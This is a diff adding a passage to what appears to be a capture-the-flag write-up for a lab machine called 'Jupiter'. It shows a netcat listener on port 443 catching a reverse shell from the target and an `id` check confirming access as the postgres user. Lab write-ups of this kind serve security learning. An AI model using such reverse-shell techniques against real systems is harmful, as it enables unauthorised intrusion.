@@ -268,3 +268,18 @@ To do it we only need to send three `requests`.
 ![11](../../../assets/images/Jupiter/11.png)
 
 <br />
+
+Check the `listener` and... YESSSS!!
+
+<br />
+
+```bash
+❯ nc -nlvp 443
+listening on [any] 443 ...
+connect to [10.10.14.28] from (UNKNOWN) [10.10.11.216] 35434
+/bin/sh: 0: can't access tty; job control turned off
+$ id    
+uid=114(postgres) gid=120(postgres) groups=120(postgres),119(ssl-cert)
+```
+
+<br />
